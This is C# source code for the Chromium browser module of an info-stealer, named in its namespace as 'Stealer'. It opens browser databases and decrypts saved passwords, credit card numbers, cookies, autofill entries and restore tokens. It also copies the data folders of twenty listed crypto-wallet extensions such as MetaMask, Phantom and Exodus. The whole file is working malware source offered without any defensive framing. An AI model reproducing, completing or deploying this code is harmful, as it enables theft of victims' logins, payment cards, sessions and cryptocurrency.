using System;
using System.IO;
using System.Collections.Generic;

using YandexDecryptor.Helpers;
using static YandexDecryptor.Helpers.Models;

namespace YandexDecryptor.Stealer.Browsers.Chromium
{
    

    internal class Chromium : IBrowser
    {

        private static readonly Dictionary<string, string> walletExtensions = new Dictionary<string, string>
        {
            { "nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask" },
            { "fhbohimaelbohpjbbldcngcnapndodjp", "Binance" },
            { "bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom" },
            { "hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase" },
            { "fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin" },
            { "aholpfdialjgjfhomihkjbmgjidlcdno", "Exodus" },
            { "aeachknmefphepccionboohckonoeemg", "Coin98" },
            { "pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain" },
            { "aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation" },
            { "amkmjjmmflddogmhpjloimipbofnfjih", "Wombat" },
            { "fnnegphlobjdpkhecapkijjdkgcjhkib", "Harmony" },
            { "lpfcbjknijpeeillifnkikgncikgfhdo", "Nami" },
            { "efbglgofoippbgcjepnhiblaibcnclgk", "MartianAptos" },
            { "jnlgamecbpmbajjfhmmmlhejkemejdma", "Braavos" },
            { "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI" },
            { "ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi" },
            { "nphplpgoakhhjchkkhmiggakijnkhfnd", "TON" },
            { "bhghoamapcdpbohphigoooaddinpkbai", "Authenticator" },
            { "ejbalbakoplchlghecdalmeeeajnimhm", "MetaMask_Edge" },
            { "ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron" }
        };


        protected LocalState localstate { get; set; }
        protected DirectoryInfo userDataPath { get; set; }

        public Chromium(string targetDirectory, string userData = "User Data") 
        {
            userDataPath = new DirectoryInfo(Environment.ExpandEnvironmentVariables(IOUtils.CombinePaths(targetDirectory, userData)));
            localstate = new LocalState(IOUtils.CombinePaths(userDataPath.FullName, "Local State"));
        }

        public string GetName()
        {
            string[] parts = userDataPath.FullName.Split(new string[] { "AppData\\Local", "AppData\\Roaming" }, StringSplitOptions.None)[1].Split('\\');
            return parts[1] + "_" + parts[2];
        }
        public bool Exists() => localstate.Exists();

        public IEnumerable<Models.BrowserProfile> GetProfiles()
        {
            return localstate.GetProfiles();
        }

        public virtual IEnumerable<Models.CreditCard> GetCards(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Web Data");
            if (File.Exists(dbName))
            {
                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("credit_cards"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        yield return new Models.CreditCard()
                        {
                            Name = IOUtils.ToUtf8(sql.GetValue(r, "name_on_card")),
                            ExpMonth = sql.GetValue(r, "expiration_month"),
                            ExpYear = sql.GetValue(r, "expiration_year"),
                            Number = localstate.Decrypt(sql.GetBytes(r, "card_number_encrypted")),
                        };
                    }
                }
            }
        }

        public virtual IEnumerable<Models.PasswordEntry> GetPasswords(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Login Data");
            if (File.Exists(dbName))
            {
                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("logins"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        yield return new Models.PasswordEntry()
                        {
                            Hostname = sql.GetValue(r, "origin_url"),
                            Username = IOUtils.ToUtf8(sql.GetValue(r, "username_value")),
                            Password = localstate.Decrypt(sql.GetBytes(r, "password_value")),
                            Application = GetName(),
                            Profile = profile.Name,
                        };
                    }
                }
            }
        }

        public virtual IEnumerable<Models.Cookie> GetCookies(Models.BrowserProfile profile)
        {

            string[] dbNames = new string[]
            {
                IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Cookies"),
                IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Network", "Cookies")
            };

            foreach (string dbName in dbNames)
            {
                if (File.Exists(dbName))
                {
                    SQLiteHandler sql = new SQLiteHandler(dbName);
                    if (sql.ReadTable("cookies"))
                    {
                        for (int r = 0; r < sql.GetRowCount(); r++)
                        {
                            string value = sql.GetValue(r, "value");
                            yield return new Models.Cookie()
                            {
                                IsSecure = sql.GetValue(r, "is_secure"),
                                HostKey = sql.GetValue(r, "host_key"),
                                Name = sql.GetValue(r, "name"),
                                Path = sql.GetValue(r, "path"),
                                ExpiresUtc = sql.GetValue(r, "expires_utc"),
                                Value = string.IsNullOrEmpty(value) ? localstate.Decrypt(sql.GetBytes(r, "encrypted_value")) : value,
                            };
                        }
                    }
                }
            }
        }

        public virtual IEnumerable<Models.AutoFill> GetAutoFills(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Web Data");
            if (File.Exists(dbName))
            {
                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("autofill"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        yield return new Models.AutoFill()
                        {
                            Name = sql.GetValue(r, "name"),
                            Value = IOUtils.ToUtf8(sql.GetValue(r, "value")),
                        };
                    }
                }
            }
        }

        public virtual IEnumerable<Models.PasswordEntry> GetTokens(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Web Data");
            if (File.Exists(dbName))
            {
                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("token_service"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        yield return new Models.PasswordEntry()
                        {
                            Hostname = "Restore Token",
                            Username = sql.GetValue(r, "service"),
                            Password = localstate.Decrypt(sql.GetBytes(r, "encrypted_token")),
                            Application = GetName(),
                            Profile = profile.Name,
                        };
                    }
                }
            }
        }

        public virtual IEnumerable<FileData> GetExtensions(BrowserProfile profile)
        {
            string extensionsDirectory = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Local Extension Settings");

            if (Directory.Exists(extensionsDirectory))
            {
                foreach (string extensionDirectory in Directory.GetDirectories(extensionsDirectory))
                {
                    if (walletExtensions.TryGetValue(Path.GetFileName(extensionDirectory), out string walletName))
                    {
                        foreach (string file in Directory.GetFiles(extensionDirectory))
                        {
                            yield return new Models.FileData()
                            {
                                Name = IOUtils.CombinePaths("Extensions", string.Format("{0}_{1}_{2}", walletName, GetName(), profile.Name), Path.GetFileName(file)),
                                Data = IOUtils.ReadFileBytes(file),
                            };
                        }
                    }
                }
            }
        }

    }
}
